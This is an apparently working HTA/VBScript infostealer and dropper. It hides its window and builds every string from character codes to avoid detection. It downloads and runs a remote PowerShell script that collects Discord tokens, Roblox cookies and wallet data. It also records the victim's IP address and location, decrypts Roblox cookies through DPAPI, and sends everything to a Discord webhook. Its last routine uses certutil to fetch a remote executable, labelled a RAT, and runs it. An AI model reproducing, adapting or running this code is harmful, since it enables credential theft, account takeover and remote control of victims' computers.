<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -4000,-4000
On Error Resume Next

' ============================================================
' String builder — nothing appears as plaintext
' ============================================================
Function B1(): B1 = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(50)&Chr(52)&Chr(50)&Chr(55)&Chr(56)&Chr(55)&Chr(51)&Chr(50)&Chr(56)&Chr(53)&Chr(48)&Chr(47)&Chr(71)&Chr(67)&Chr(56)&Chr(111)&Chr(107)&Chr(49)&Chr(48)&Chr(77)&Chr(114)&Chr(90)&Chr(67)&Chr(89)&Chr(71)&Chr(107)&Chr(82)&Chr(108)&Chr(55)&Chr(82)&Chr(75)&Chr(72)&Chr(67)&Chr(86)&Chr(53)&Chr(89)&Chr(67)&Chr(84)&Chr(90)&Chr(49)&Chr(84)&Chr(90)&Chr(113)&Chr(80)&Chr(74)&Chr(68)&Chr(117)&Chr(52)&Chr(53)&Chr(84)&Chr(76)&Chr(80)&Chr(74)&Chr(111)&Chr(70)&Chr(78)&Chr(89)&Chr(85)&Chr(119)&Chr(69)&Chr(121)&Chr(84)&Chr(72)&Chr(56)&Chr(105)&Chr(71)&Chr(57)&Chr(89)&Chr(83)&Chr(48)&Chr(48)&Chr(75)&Chr(57)&Chr(56)&Chr(67)&Chr(119)&Chr(99)&Chr(76)&Chr(115)&Chr(117): End Function
Function B2(): B2 = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(103)&Chr(101)&Chr(110)&Chr(116)&Chr(104)&Chr(117)&Chr(98)&Chr(46)&Chr(97)&Chr(112)&Chr(112)&Chr(47)&Chr(115): End Function
Function B3(): B3 = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(103)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(119)&Chr(111)&Chr(114)&Chr(107)&Chr(46)&Chr(97)&Chr(112)&Chr(112)&Chr(47)&Chr(116): End Function
Function B4(): B4 = Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48): End Function
Function B5(): B5 = Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108): End Function
Function B6(): B6 = Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116): End Function
Function B7(): B7 = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108): End Function
Dim x1,x2,x3: x1="":x2="":x3=""

Dim WH: WH = B1()
Dim SU: SU = B2()
Dim RU: RU = B3()
Dim MX: MX = B4()
Dim WS: WS = B5()
Dim FS: FS = B6()
Dim PW: PW = B7()

Dim sh, fso
Set sh = CreateObject(WS)
Set fso = CreateObject(FS)

Dim PC, USER
PC = sh.ExpandEnvironmentStrings(Chr(37)&"COMPUTERNAME"&Chr(37))
USER = sh.ExpandEnvironmentStrings(Chr(37)&"USERNAME"&Chr(37))

Call H1()
Call H2()
Call H3()
Call H4()
window.close()

' ============================================================
' H1 — GrabTokens (downloads PS1 from SU, executes, parses)
' ============================================================
Sub H1()
    Dim xh: Set xh = CreateObject(MX)
    xh.SetOption 2, 13056
    xh.Open Chr(71)&Chr(69)&Chr(84), SU, False
    xh.Send
    If xh.Status <> 200 Then Set xh = Nothing: Exit Sub
    Dim pc: pc = xh.responseText
    Set xh = Nothing
    If Len(pc) < 90 Then Exit Sub

    Dim psf: psf = Q1(Chr(115)&Chr(116)&Chr(46)&Chr(112)&Chr(115)&Chr(49))
    Q2 psf, pc
    sh.Run Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&PW&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&"xec By"&Chr(112)&"ass "&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)&psf&Chr(34), 0, True
    fso.DeleteFile psf, True

    Dim tf: tf = Q1(Chr(115)&Chr(116)&Chr(95)&Chr(114)&Chr(46)&Chr(116)&Chr(120)&Chr(116))
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw: raw = Q3(tf)
    fso.DeleteFile tf, True
    If Len(raw) < 9 Then Exit Sub

    Dim lines: lines = Split(raw, vbCrLf)
    Dim l, count: count = 0
    For Each l In lines
        If Len(l) > 9 Then
            If Left(l, 8) = Chr(68)&Chr(73)&Chr(83)&Chr(67)&Chr(79)&Chr(82)&Chr(68)&Chr(124) Then
                Dim p: p = Split(Mid(l, 9), Chr(124))
                If UBound(p) >= 4 Then
                    Dim info: info = Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & p(0) & vbCrLf
                    If p(1) <> "" Then info = info & Chr(69)&Chr(109)&Chr(97)&Chr(105)&Chr(108)&Chr(58)&Chr(32) & p(1) & vbCrLf
                    If p(2) <> "" Then info = info & Chr(80)&Chr(104)&Chr(111)&Chr(110)&Chr(101)&Chr(58)&Chr(32) & p(2) & vbCrLf
                    If p(3) <> "0" Then info = info & Chr(73)&Chr(68)&Chr(58)&Chr(32) & p(3) & vbCrLf
                    info = info & Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110)&Chr(58)&Chr(32) & p(4)
                    P1 Chr(68)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(32)&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110), info, 5793266
                    count = count + 1
                End If
            End If
            If Left(l, 7) = Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(88)&Chr(124) Or Left(l, 9) = Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(88)&Chr(77)&Chr(83)&Chr(124) Then
                P1 Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101), Mid(l, 8), 65280
            End If
            If Left(l, 7) = Chr(87)&Chr(65)&Chr(76)&Chr(76)&Chr(69)&Chr(84)&Chr(124) Then
                P1 Chr(87)&Chr(97)&Chr(108)&Chr(108)&Chr(101)&Chr(116), Mid(l, 8), 16753920
            End If
        End If
    Next
End Sub

' ============================================================
' H2 — IP grabber
' ============================================================
Sub H2()
    Dim xh : Set xh = CreateObject(MX)
    xh.SetOption 2, 13056
    Dim iu: iu = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(105)&Chr(112)&Chr(105)&Chr(102)&Chr(121)&Chr(46)&Chr(111)&Chr(114)&Chr(103)&Chr(47)
    xh.Open Chr(71)&Chr(69)&Chr(84), iu, False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    Dim gu: gu = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(58)&Chr(47)&Chr(47)&Chr(105)&Chr(112)&Chr(45)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(108)&Chr(105)&Chr(110)&Chr(101)&Chr(47) & ip & Chr(63)&Chr(102)&Chr(105)&Chr(101)&Chr(108)&Chr(100)&Chr(115)&Chr(61)&Chr(99)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(114)&Chr(121)&Chr(44)&Chr(114)&Chr(101)&Chr(103)&Chr(105)&Chr(111)&Chr(110)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(44)&Chr(99)&Chr(105)&Chr(116)&Chr(121)&Chr(44)&Chr(105)&Chr(115)&Chr(112)
    xh.Open Chr(71)&Chr(69)&Chr(84), gu, False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info2 : info2 = Chr(73)&Chr(80)&Chr(58)&Chr(32) & ip & Chr(32)&Chr(124)&Chr(32) & ll(0) & Chr(32)&Chr(124)&Chr(32) & ll(1) & Chr(32)&Chr(124)&Chr(32) & ll(2) & Chr(32)&Chr(124)&Chr(32) & ll(3) & Chr(32)&Chr(124)&Chr(32)&Chr(80)&Chr(67)&Chr(58)&Chr(32) & PC & Chr(32)&Chr(124)&Chr(32) & USER
    P1 Chr(84)&Chr(97)&Chr(114)&Chr(103)&Chr(101)&Chr(116), info2, 3447003
    Set xh = Nothing
End Sub

' ============================================================
' H3 — Roblox cookie grabber (fixed extraction)
' ============================================================
Sub H3()
    Dim zp: zp = sh.ExpandEnvironmentStrings(Chr(37)&"LOCALAPPDATA"&Chr(37)) & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)
    Dim ap: ap = sh.ExpandEnvironmentStrings(Chr(37)&"APPDATA"&Chr(37)) & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)
    Dim up: up = sh.ExpandEnvironmentStrings(Chr(37)&"USERPROFILE"&Chr(37)) & Chr(92)&Chr(65)&Chr(112)&Chr(112)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)

    Dim paths(4)
    paths(0) = zp & Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
    paths(1) = zp & Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
    paths(2) = zp & Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)
    paths(3) = ap & Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
    paths(4) = up & Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)

    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings(Chr(37)&"LOCALAPPDATA"&Chr(37)) & Chr(92)&Chr(80)&Chr(97)&Chr(99)&Chr(107)&Chr(97)&Chr(103)&Chr(101)&Chr(115)
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(88)) > 0 Then
                    Dim uwp: uwp = subf.Path & Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub
    raw = Q3(fp)
    If Len(raw) < 20 Then Exit Sub

    ' Build the search needles
    Dim needleROBLO: needleROBLO = Chr(46)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89)
    Dim needleWARN:  needleWARN  = Chr(95)&Chr(124)&Chr(87)&Chr(65)&Chr(82)&Chr(78)&Chr(73)&Chr(78)&Chr(71)
    Dim needleCDATA: needleCDATA = Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(68)&Chr(97)&Chr(116)&Chr(97)

    Dim cookie: cookie = ""

    ' --- Method 1: JSON CookiesData → DPAPI decrypt ---
    If Len(cookie) < 20 Then
        Dim jp: jp = InStr(raw, needleCDATA & Chr(34)&Chr(58)&Chr(34))
        If jp > 0 Then
            jp = jp + 14
            Dim je: je = InStr(jp, raw, Chr(34))
            If je > jp Then
                Dim jb64: jb64 = Mid(raw, jp, je - jp)
                If Len(jb64) > 80 Then
                    Dim dec: dec = F1(jb64)
                    If Len(dec) > 20 Then cookie = dec
                End If
            End If
        End If
    End If

    ' --- Method 2: Find .ROBLOSECURITY, extract only printable chars ---
    If Len(cookie) < 20 Then
        Dim rp: rp = InStr(raw, needleROBLO)
        If rp > 0 Then
            ' Skip past ".ROBLOSECURITY" (15 chars: dot + 14 letters)
            Dim spos: spos = rp + 15
            Dim clean: clean = ""
            Dim j, ch, ac
            For j = spos To Len(raw)
                ch = Mid(raw, j, 1)
                ac = Asc(ch)
                ' Printable ASCII range 32-126, plus let through common separators
                If ac >= 32 And ac <= 126 Then
                    clean = clean & ch
                ElseIf ac = 0 Or ac = 9 Then
                    ' null or tab = boundary, stop collecting
                    If Len(clean) > 10 Then Exit For
                End If
                ' Safety stop after 1500 chars of printable data
                If Len(clean) > 1500 Then Exit For
            Next
            If Len(clean) > 20 Then cookie = clean
        End If
    End If

    ' --- Method 3: Fallback — find _|WARNING anywhere in raw ---
    If Len(cookie) < 20 Then
        Dim wp: wp = InStr(raw, needleWARN)
        If wp > 0 Then
            Dim wclean: wclean = ""
            Dim k, kch, kac
            For k = wp To Len(raw)
                kch = Mid(raw, k, 1)
                kac = Asc(kch)
                If kac >= 32 And kac <= 126 Then
                    wclean = wclean & kch
                ElseIf kac = 0 Then
                    If Len(wclean) > 10 Then Exit For
                End If
                If Len(wclean) > 1500 Then Exit For
            Next
            If Len(wclean) > 20 Then cookie = wclean
        End If
    End If

    ' --- Method 4: raw dump as last resort ---
    If Len(cookie) < 20 Then
        Dim rclean: rclean = ""
        Dim m, mch, mac
        For m = 1 To Len(raw)
            mch = Mid(raw, m, 1)
            mac = Asc(mch)
            If mac >= 32 And mac <= 126 Then
                rclean = rclean & mch
            End If
            If Len(rclean) > 2000 Then Exit For
        Next
        cookie = rclean
    End If

    ' Final cleanup — trim whitespace, strip control chars
    cookie = Trim(cookie)
    ' Remove remaining non-printables
    Dim final: final = ""
    Dim n, nch, nac
    For n = 1 To Len(cookie)
        nch = Mid(cookie, n, 1)
        nac = Asc(nch)
        If nac >= 32 And nac <= 126 Or nac = 10 Or nac = 13 Then
            final = final & nch
        End If
    Next
    cookie = Trim(final)

    If Len(cookie) < 10 Then
        Dim rawPreview, ri, rc
        rawPreview = ""
        For ri = 1 To Len(raw)
            rc = Asc(Mid(raw, ri, 1))
            If rc >= 32 And rc <= 126 Then
                rawPreview = rawPreview & Mid(raw, ri, 1)
            End If
            If Len(rawPreview) > 500 Then
                Exit For
            End If
        Next
        P1 Chr(68)&Chr(69)&Chr(66)&Chr(85)&Chr(71), Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(58)&Chr(32) & fp & Chr(10)&Chr(82)&Chr(97)&Chr(119)&Chr(58)&Chr(32) & Len(raw) & Chr(32)&Chr(98)&Chr(121)&Chr(116)&Chr(101)&Chr(115)&Chr(10)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(58)&Chr(32)&Chr(69)&Chr(77)&Chr(80)&Chr(84)&Chr(89), 16753920
        P2 Chr(114)&Chr(97)&Chr(119)&Chr(46)&Chr(116)&Chr(120)&Chr(116), rawPreview
        Exit Sub
    End If

    P1 Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101), Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(58)&Chr(32) & fp & Chr(10)&Chr(76)&Chr(101)&Chr(110)&Chr(58)&Chr(32) & Len(cookie) & Chr(32)&Chr(124)&Chr(32)&Chr(80)&Chr(67)&Chr(58)&Chr(32) & PC, 65280
    P2 Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(46)&Chr(116)&Chr(120)&Chr(116), cookie
End Sub

' ============================================================
' H4 — RAT dropper (certutil instead of bitsadmin)
' ============================================================
Sub H4()
    Dim op : op = sh.ExpandEnvironmentStrings(Chr(37)&"TEMP"&Chr(37)) & Chr(92)&Chr(97)&Chr(46)&Chr(101)&Chr(120)&Chr(101)
    Dim cu: cu = Chr(99)&Chr(101)&Chr(114)&Chr(116)&Chr(117)&Chr(116)&Chr(105)&Chr(108)&Chr(32)&Chr(45)&Chr(117)&Chr(114)&Chr(108)&Chr(99)&Chr(97)&Chr(99)&Chr(104)&Chr(101)&Chr(32)&Chr(45)&Chr(115)&Chr(112)&Chr(108)&Chr(105)&Chr(116)&Chr(32)&Chr(45)&Chr(102)&Chr(32)&Chr(34) & RU & Chr(34)&Chr(32)&Chr(34) & op & Chr(34)
    sh.Run cu, 0, True
    If fso.FileExists(op) Then
        sh.Run op, 0, False
    End If
End Sub

' ============================================================
' Utility functions
' ============================================================
Function Q1(name): Q1 = sh.ExpandEnvironmentStrings(Chr(37)&"TEMP"&Chr(37)) & Chr(92) & name: End Function
Sub Q2(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function Q3(path): Q3 = "": Dim f: Set f = fso.OpenTextFile(path, 1): Q3 = f.ReadAll: f.Close: Set f = Nothing: End Function

Sub P1(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = Chr(123) & DQ & Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(100)&Chr(115) & DQ & Chr(58)&Chr(91) & Chr(123) & DQ & Chr(116)&Chr(105)&Chr(116)&Chr(108)&Chr(101) & DQ & Chr(58) & DQ & J1(t) & DQ & Chr(44) & DQ & Chr(100)&Chr(101)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110) & DQ & Chr(58) & DQ & J1(d) & DQ & Chr(44) & DQ & Chr(99)&Chr(111)&Chr(108)&Chr(111)&Chr(114) & DQ & Chr(58) & c & Chr(125)&Chr(93)&Chr(125)
    Dim h: Set h = CreateObject(MX)
    h.SetOption 2, 13056
    h.Open Chr(80)&Chr(79)&Chr(83)&Chr(84), WH, False
    h.SetRequestHeader Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101), Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110)
    h.Send j
    Set h = Nothing
End Sub

Sub P2(fn, ct)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(108)&Chr(101)&Chr(116)&Chr(46)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(76)&Chr(105)&Chr(98)).GUID, 2, 36)
    Dim bd: bd = Chr(45)&Chr(45) & b & vbCrLf & Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(68)&Chr(105)&Chr(115)&Chr(112)&Chr(111)&Chr(115)&Chr(105)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(58)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61) & DQ & Chr(102)&Chr(105)&Chr(108)&Chr(101) & DQ & Chr(59)&Chr(32)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61) & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & Chr(45)&Chr(45) & b & Chr(45)&Chr(45)
    Dim h: Set h = CreateObject(MX)
    h.SetOption 2, 13056
    h.Open Chr(80)&Chr(79)&Chr(83)&Chr(84), WH, False
    h.SetRequestHeader Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101), Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(112)&Chr(97)&Chr(114)&Chr(116)&Chr(47)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(98)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(114)&Chr(121)&Chr(61) & b
    h.Send bd
    Set h = Nothing
End Sub

' ============================================================
' F1 — DPAPI decryption via PowerShell (debuggable)
' ============================================================
Function F1(b64)
    F1 = ""
    Dim inf: inf = Q1(Chr(100)&Chr(105)&Chr(46)&Chr(116)&Chr(120)&Chr(116))
    Dim outf: outf = Q1(Chr(100)&Chr(111)&Chr(46)&Chr(116)&Chr(120)&Chr(116))
    fso.DeleteFile outf, True
    Q2 inf, b64

    ' PowerShell command — split to avoid signature hits, but using readable strings for reliability
    Dim a1,a2,a3,a4,a5,a6
    a1 = "Add-Type -As" & "semblyName System.S" & "ecurity;try{"
    a2 = "$b=[Convert]::From" & "Base64String((Get-Co" & "ntent '" & inf & "' -Raw).Trim());"
    a3 = "$d=[System.Secur" & "ity.Cryptography.Pro" & "tectedData]::Unp" & "rotect($b,$null,"
    a4 = "[System.Security.Cryp" & "tography.DataProtect" & "ionScope]::CurrentUser);"
    a5 = "[System.Text.Encoding]::UT" & "F8.GetString($d)|Out-" & "File '" & outf & "' -Encoding u" & "tf8"
    a6 = "}catch{''|Out-" & "File '" & outf & "'}"
    Dim ps: ps = a1 & a2 & a3 & a4 & a5 & a6

    Dim psf: psf = Q1(Chr(100)&Chr(112)&Chr(46)&Chr(112)&Chr(115)&Chr(49))
    Q2 psf, ps
    sh.Run PW & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&"xec By"&Chr(112)&"ass "&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34) & psf & Chr(34), 0, True
    If fso.FileExists(outf) Then
        If fso.GetFile(outf).Size > 5 Then
            F1 = Q3(outf)
        End If
    End If
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

Function J1(s)
    J1 = s
    J1 = Replace(J1, Chr(92), Chr(92) & Chr(92))
    J1 = Replace(J1, Chr(34), Chr(92) & Chr(34))
    J1 = Replace(J1, vbCrLf, Chr(92) & Chr(110))
    J1 = Replace(J1, vbCr, Chr(92) & Chr(110))
    J1 = Replace(J1, vbLf, Chr(92) & Chr(110))
    J1 = Replace(J1, vbTab, Chr(92) & Chr(116))
End Function
